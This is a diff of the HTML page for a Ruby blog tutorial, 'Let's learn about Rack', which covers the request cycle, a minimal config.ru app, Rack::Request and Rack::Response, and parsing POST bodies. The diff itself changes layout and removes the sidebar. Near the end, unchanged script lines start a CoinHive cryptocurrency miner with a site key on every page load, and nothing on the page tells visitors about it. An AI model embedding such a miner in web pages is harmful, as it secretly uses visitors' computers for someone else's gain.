@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hostile Developer - Let's learn about Rack</title>
   <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
   <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
@@ -12,23 +13,17 @@
   <section id="header">
   <header>
 <a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
-
-        <h3 class="tag-line">I am Steven. Hear me Rant.</h3>
+        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
 </a>  </header>
 
   <section class='social'>
     <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
     <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
   </section>
-  <nav>
-    <ul class='links'>
-      <li><a href="/">Home</a></li>
-    </ul>
-  </nav>
 </section>
 
 
-  <main id='articles' role="main">
+  <main id='article' role="main">
     <h1 class="article-title"><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a></h1>
     <h1>Why learn rack?</h1>
 
@@ -59,7 +54,7 @@
 <h2>The request cycle</h2>
 
 <p>What does your app receive when your user &ldquo;sends a request&rdquo;? Let&rsquo;s say your user is trying to get to the home page. They go to <code>http://example.com</code>, and (after some DNS magic) the browser sends you something that looks like this</p>
-<pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -75,8 +70,7 @@ Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
 Accept-Encoding: gzip, deflate, sdch
 Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>If you want to try this your self, run <a href="https://gist.github.com/StevenNunez/17487d85c5493fb4404e">this</a> script and visit <code>http://localhost:9292</code> in an incognito browser.</p>
 
 <p>Ok, so you get this and what are are you supposed to do with it? If you&rsquo;re working with a <a href="https://www.digitalocean.com/community/tutorials/a-comparison-of-rack-web-servers-for-ruby-web-applications">Rack</a> Compliant web server, it&rsquo;s going to take this information and parse it into something your app can more easily work with: A Hash.</p>
@@ -84,7 +78,7 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <p>To see what this looks like to your <code>Rack</code> app, let&rsquo;s make a simple one.</p>
 
 <p>All we have to do to make a <code>Rack</code> app is create an object that responds to the <code>call</code> method and takes one argument. We&rsquo;ll do that by making an <code>App</code> class with a <code>call</code> instance method. We&rsquo;ll make it respond with an array of 3 values: The status code, any headers, and the body in an array. Stick this in a file named <code>config.ru</code></p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -102,10 +96,9 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <span class="k">end</span>
 
 <span class="n">run</span> <span class="no">App</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Run <code>rackup</code> and visit <code>http://localhost:9292</code>. You should see something like this:</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -183,8 +176,7 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
                   <span class="s2">"rack.tempfiles"</span> <span class="o">=&gt;</span> <span class="p">[]</span>
 <span class="p">}</span>
 
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This looks a lot like what the browser sent us! What method did we use? Check <code>env[&quot;REQUEST_METHOD&quot;]</code>. Want to know where they were going? Check <code>env[&quot;PATH_INFO&quot;]</code>.</p>
 
 <p>Simple. We get a Hash, and return an array&hellip; but EW, we get a HASH and return an ARRAY?!</p>
@@ -192,7 +184,7 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <p>We know a thing or two about <a href="http://c2.com/cgi/wiki?PrimitiveObsession">Primitive Obsession</a>, so let&rsquo;s wrap these in objects. Lucky for us, <code>Rack</code> comes with a ways to wrap them nicely. <code>Rack::Request</code>, and <code>Rack::Response</code>.</p>
 
 <p>Let&rsquo;s upgrade our code to look like this:</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -208,12 +200,11 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <span class="k">end</span>
 
 <span class="n">run</span> <span class="no">App</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Visit <code>http://localhost:9292</code> and you&rsquo;ll see <code>You made a GET request to /</code>. Visit <code>http://localhost:9292/banana</code> and you&rsquo;ll see <code>You made a GET request to /banana</code>.</p>
 
 <p>We can reduce a bit of code by taking advantage of some Rack defaults, and the <code>Rack::ContentType</code> middleware. Let&rsquo;s modify our code to look like this</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -231,8 +222,7 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 
 <span class="n">use</span> <span class="no">Rack</span><span class="o">::</span><span class="no">ContentType</span>
 <span class="n">run</span> <span class="no">App</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p><code>Rack::ContentType</code> sets all outgoing responses to be &lsquo;text/html&rsquo;. If you need to override this, say to have it always return <code>application/json</code>, try <code>use Rack::ContentType, &#39;application/json&#39;</code> instead.</p>
 
 <p><code>Rack::Response</code> sets its second constructor argument to <code>200</code> by default, so we can leave it out. So clean!</p>
@@ -240,7 +230,7 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <h3>Dealing with post requests and request bodies</h3>
 
 <p>Load up the <code>rest-client</code> gem in the console and try this.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -248,10 +238,9 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 <span class="nb">require</span> <span class="s1">'rest-client'</span>
 <span class="no">RestClient</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"http://localhost:9292/banana"</span><span class="p">,</span> <span class="p">{</span><span class="ss">potassium: </span><span class="s2">"High"</span><span class="p">}).</span><span class="nf">body</span>
 <span class="c1"># =&gt; "You made a POST request to /banana"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>It works&hellip; but how do we work with those parameters? Come on Rack, don&rsquo;t be stingy, let me see those sweet sweet params I sent you bruh. Let&rsquo;s update our code to read the request&rsquo;s body. According to the <a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html">RFC</a> (try reading these if you&rsquo;re having trouble sleeping) the body of a request is &ldquo;used to carry the entity-body associated with the request or response&rdquo;. Basically, the goods we&rsquo;re after. We can read them with rack by using the <code>body</code> method on a request object. Let&rsquo;s update the code to output we sent in our post request.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -269,17 +258,15 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 
 <span class="n">use</span> <span class="no">Rack</span><span class="o">::</span><span class="no">ContentType</span>
 <span class="n">run</span> <span class="no">App</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And then back in <code>irb</code></p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="no">RestClient</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"http://localhost:9292/banana"</span><span class="p">,</span> <span class="p">{</span><span class="ss">potassium: </span><span class="s2">"High"</span><span class="p">}).</span><span class="nf">body</span>
 <span class="c1"># =&gt; "You made a POST request to /banana here's the body potassium=High"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Sweet11!!1! Except&hellip; I gave you a hash, and you gave me a mashed up string. WTF rack. Easy fix, though. We can use <code>Rack::Utils.parse_nested_query</code> to get it into an easier form for us to work with.</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -299,15 +286,13 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 
 <span class="n">use</span> <span class="no">Rack</span><span class="o">::</span><span class="no">ContentType</span>
 <span class="n">run</span> <span class="no">App</span><span class="p">.</span><span class="nf">new</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And&hellip;</p>
-<pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight ruby"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="rouge-code"><pre><span class="no">RestClient</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="s2">"http://localhost:9292/banana"</span><span class="p">,</span> <span class="p">{</span><span class="ss">potassium: </span><span class="s2">"High"</span><span class="p">}).</span><span class="nf">body</span>
 <span class="c1"># =&gt; "You made a POST request to /banana here's the body {\"potassium\"=&gt;\"High\"}"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Now we&rsquo;re cooking with gas!</p>
 
 <h1>That&rsquo;s it for the basics</h1>
@@ -333,103 +318,6 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
 
   </main>
 
-  <aside id="history">
-    <section class="recent">
-      <h2>Recent Articles</h2>
-      <ol class="articles">
-            <li><a href="/2017/06/17/ltrees-in-phoenix.html">LTrees in Phoenix</a>
-            <li><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a>
-            <li><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a>
-            <li><a href="/2016/08/24/learn-to-program-with-elixir.html">Learn to Program with Elixir</a>
-            <li><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a>
-            <li><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a>
-            <li><a href="/2016/02/24/hey-watch-it-or-how-to-monitor-files-in-elixir.html">Hey! Watch it!...or how to monitor files in Elixir</a>
-            <li><a href="/2015/08/23/let-s-build-something-with-rack.html">Let's build something with Rack</a>
-            <li><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a>
-            <li><a href="/2015/06/08/rails-foreign-key-constraints-the-ugly-way.html">Rails Foreign Key Constraints - The Ugly Way</a>
-      </ol>
-    </section>
-
-    <section class="tags">
-      <h2>Tags</h2>
-      <ol>
-            <li><a href="/tags/beginner.html">Beginner</a> (1)</a></li>
-            <li><a href="/tags/concurrency.html">Concurrency</a> (1)</a></li>
-            <li><a href="/tags/ecto.html">Ecto</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">Elixir</a> (3)</a></li>
-            <li><a href="/tags/ltrees.html">LTrees</a> (1)</a></li>
-            <li><a href="/tags/learn-to-program.html">Learn to Program</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">Phoenix</a> (1)</a></li>
-            <li><a href="/tags/processes.html">Processes</a> (1)</a></li>
-            <li><a href="/tags/random-thoughts.html">Random Thoughts</a> (1)</a></li>
-            <li><a href="/tags/authentication.html">authentication</a> (1)</a></li>
-            <li><a href="/tags/basics.html">basics</a> (1)</a></li>
-            <li><a href="/tags/beginner.html">beginner</a> (1)</a></li>
-            <li><a href="/tags/closures.html">closures</a> (1)</a></li>
-            <li><a href="/tags/components-of-programming.html">components of programming</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">elixir</a> (5)</a></li>
-            <li><a href="/tags/enumerable.html">enumerable</a> (1)</a></li>
-            <li><a href="/tags/file-watchers.html">file watchers</a> (1)</a></li>
-            <li><a href="/tags/find.html">find</a> (1)</a></li>
-            <li><a href="/tags/fs.html">fs</a> (1)</a></li>
-            <li><a href="/tags/fundamentals.html">fundamentals</a> (1)</a></li>
-            <li><a href="/tags/generators.html">generators</a> (1)</a></li>
-            <li><a href="/tags/guardian.html">guardian</a> (1)</a></li>
-            <li><a href="/tags/javascript.html">javascript</a> (3)</a></li>
-            <li><a href="/tags/learning.html">learning</a> (1)</a></li>
-            <li><a href="/tags/navigation.html">navigation</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">phoenix</a> (1)</a></li>
-            <li><a href="/tags/polyglot.html">polyglot</a> (1)</a></li>
-            <li><a href="/tags/postgresql.html">postgresql</a> (1)</a></li>
-            <li><a href="/tags/promises.html">promises</a> (1)</a></li>
-            <li><a href="/tags/rack.html">rack</a> (2)</a></li>
-            <li><a href="/tags/rails.html">rails</a> (2)</a></li>
-            <li><a href="/tags/redux.html">redux</a> (1)</a></li>
-            <li><a href="/tags/routing.html">routing</a> (1)</a></li>
-            <li><a href="/tags/ruby.html">ruby</a> (6)</a></li>
-            <li><a href="/tags/sharp-axe.html">sharp axe</a> (1)</a></li>
-            <li><a href="/tags/something-useless.html">something useless</a> (2)</a></li>
-            <li><a href="/tags/web.html">web</a> (1)</a></li>
-      </ol>
-    </section>
-    <section class="by-month">
-      <h2>By Month</h2>
-      <ol>
-            <li><a href="/2017/06.html">June 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/05.html">May 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/04.html">April 2017</a>
-              (1)</a></li>
-            <li><a href="/2016/08.html">August 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/05.html">May 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/04.html">April 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/02.html">February 2016</a>
-              (1)</a></li>
-            <li><a href="/2015/08.html">August 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/06.html">June 2015</a>
-              (1)</a></li>
-            <li><a href="/2015/05.html">May 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/02.html">February 2015</a>
-              (1)</a></li>
-            <li><a href="/2014/11.html">November 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/05.html">May 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/04.html">April 2014</a>
-              (2)</a></li>
-            <li><a href="/2014/02.html">February 2014</a>
-              (1)</a></li>
-            <li><a href="/2013/10.html">October 2013</a>
-              (1)</a></li>
-      </ol>
-    </section>
-  </aside>
  <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -446,6 +334,8 @@ Accept-Language: en-US,en;q=0.8,es-419;q=0.6,es;q=0.4
    var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
    miner.start();
  </script>
+
+ <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>
 
 </div>
 </body>
